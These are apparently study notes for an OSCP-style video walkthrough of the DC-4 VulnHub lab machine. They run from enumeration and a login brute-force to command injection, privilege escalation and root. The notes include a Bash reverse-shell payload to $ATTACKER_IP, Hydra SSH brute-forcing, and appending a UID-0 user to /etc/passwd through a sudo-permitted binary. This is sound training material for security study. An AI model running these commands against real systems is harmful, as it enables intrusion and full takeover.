@@ -1,0 +1,83 @@
+The following are comprehensive notes and commands for the OSCP methodology demonstrated in the video walkthrough of the **DC-4 VulnHub machine**.
+
+The walkthrough follows the standard penetration testing phases, with key commands and takeaways outlined below.
+
+***
+
+## 1. Initial & Web Enumeration
+
+This phase involves discovering open ports and hidden files/directories on the target.
+
+| Tool/Action | Command/Action Summary | Takeaway/Observation | Timestamp |
+| :--- | :--- | :--- | :--- |
+| **Nmap Scan** | `nmap -p- -sV $TARGET_IP --open` | Ports **22 (SSH)** and **80 (HTTP)** are open. The target OS is **Debian**. | [[30:33](http://www.youtube.com/watch?v=scFBo3j6iLM&t=1833)] |
+| **Directory Fuzzing** | `wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt/ --hc 404 $URL/FUZZ/` | Found key files: **`/login.php`** and **`/command.php`**. | [[37:42](http://www.youtube.com/watch?v=scFBo3j6iLM&t=2262)] |
+
+***
+
+## 2. Initial Access & Shell Compromise
+
+Initial access was gained by brute-forcing the login panel and then exploiting a command injection vulnerability.
+
+### A. Authentication Brute-Force
+
+1.  **Intercept Login:** The `/login.php` page handles POST data for `username` and `password`. The request was sent to **Burp Suite's Intruder** [0m46s20s].
+2.  **Brute-Force:** Used **Rockyou.txt** as the payload list against the password field with a static `admin` username [[46:52](http://www.youtube.com/watch?v=scFBo3j6iLM&t=2812)].
+3.  **Discovery:** The correct password for `admin` was found by sorting the response length, revealing a different length for the successful login [[51:38](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3098)].
+    * **Credentials:** `admin:happy` [[52:36](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3156)]
+
+### B. Command Injection to Reverse Shell
+
+1.  **Vulnerability Discovery:** The authenticated interface shows an area to "run command" [[54:53](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3293)]. Testing with an injected command confirmed **Command Injection** as the system level output was returned.
+    * **Test Command (via Burp Repeater):** Send `ID` in the `command` POST parameter.
+    * **Response:** Confirmed low-privilege user: `uid=33(www-data)` [[56:40](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3400)]
+2.  **Netcat Listener:** Set up a listener on the attacker machine.
+    * **Command:** `nc -nlvp 9090` [[58:18](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3498)]
+3.  **Reverse Shell Payload:** A Bash reverse shell was **URL encoded** and sent via the command injection vulnerability to the listener [[57:49](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3469)].
+    * **Bash Payload (Unencoded):** `bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1'`
+
+### C. Shell Stabilization (TTY)
+
+A stabilized shell is crucial for using tools, job control, and cleaner command-line interaction.
+
+| Step | Command | Purpose | Timestamp |
+| :--- | :--- | :--- | :--- |
+| **1. Spawn TTY** | `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to a basic TTY shell. | [[58:40](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3520)] |
+| **2. Background Shell** | **`CTRL+Z`** | Stop and background the current shell process. | [[59:43](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3583)] |
+| **3. Stabilize** | `stty raw -echo; fg` | Disable local echoing, and bring the shell back to the foreground. | [[59:49](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3589)] |
+| **4. Reset Terminal** | `reset` | Re-initializes the terminal to allow for correct visual interaction (e.g., clearing the screen). | [[01:00:04](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3604)] |
+| **5. Environment Variable** | `export TERM=xterm-256color` | Set terminal type for better color and compatibility. | [[01:00:15](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3615)] |
+
+***
+
+## 3. Post-Exploitation & Privilege Escalation
+
+This phase involves enumerating the system for weaknesses to gain a higher-privileged shell.
+
+### A. Account Discovery
+
+| Action | Command/Action Summary | Takeaway/Observation | Timestamp |
+| :--- | :--- | :--- | :--- |
+| **User Enumeration** | `ls -l /home/` | Found potential non-root users: **Charles**, **Jim**, and **Sam**. | [[01:04:53](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3893)] |
+| **Local Enumeration** | `cat /home/jim/backups/old-passwords.bak` (Implicit) | Found various passwords for brute-forcing against SSH. | [[01:05:15](http://www.youtube.com/watch?v=scFBo3j6iLM&t=3915)] |
+| **Brute-Force** | `hydra -L users -P passwords ssh://$TARGET_IP` | **Hydra** found valid credentials for the user **Jim** (user: `jim`, password: `jibril04`) | [[01:10:03](http://www.youtube.com/watch?v=scFBo3j6iLM&t=4203)] |
+| **Lateral Movement** | `ssh jim@$TARGET_IP` | Logged in as `jim` to get a stable, non-web-user shell [[01:11:04](http://www.youtube.com/watch?v=scFBo3j6iLM&t=4264)]. |
+
+### B. Privilege Escalation to Root (sudo `t` Abuse)
+
+1.  **Discover Sudo Privileges:** The `jim` account was found to have a specific sudo privilege.
+    * **Command:** `sudo -l`
+    * **Takeaway:** User `jim` can run **`/usr/bin/t`** as root without a password [[01:12:00](http://www.youtube.com/watch?v=scFBo3j6iLM&t=4320)].
+2.  **Exploit Strategy:** The `t` utility has an **`-a` (append)** flag. This allows appending arbitrary text (as root) to any file, including the critical system file **`/etc/passwd`**.
+3.  **Generate Root User Hash:** A new password hash for a custom user (`siren`) is created using OpenSSL on the attacking machine.
+    * **Command (Example):** `openssl passwd -1 -salt 'iHaCknig' 'iharthacking'`
+4.  **Append Root User to `/etc/passwd`:** The custom user and hash are appended to the password file. The key fields for a root user are UID **0** and GID **0**.
+    * **Command:** `echo 'siren:HASH_FROM_ABOVE:0:0:Siren:/root:/bin/bash' \| sudo /usr/bin/t -a /etc/passwd`
+    * *Note: In the video, this was executed by typing the user string after running `sudo t -a /etc/passwd` and then pressing `CTRL+D`.* [[01:15:30](http://www.youtube.com/watch?v=scFBo3j6iLM&t=4530)]
+5.  **Gain Root:** Switch to the newly created user using the chosen password.
+    * **Command:** `su siren`
+    * **Password:** `iharthacking`
+    * **Result:** The user is now **root** (`whoami` command confirms `root` [[01:16:20](http://www.youtube.com/watch?v=scFBo3j6iLM&t=4580)]).
+
+The URL for the video is: [DC-4 Walkthrough with S1REN](http://www.youtube.com/watch?v=scFBo3j6iLM)
+http://googleusercontent.com/youtube_content/0
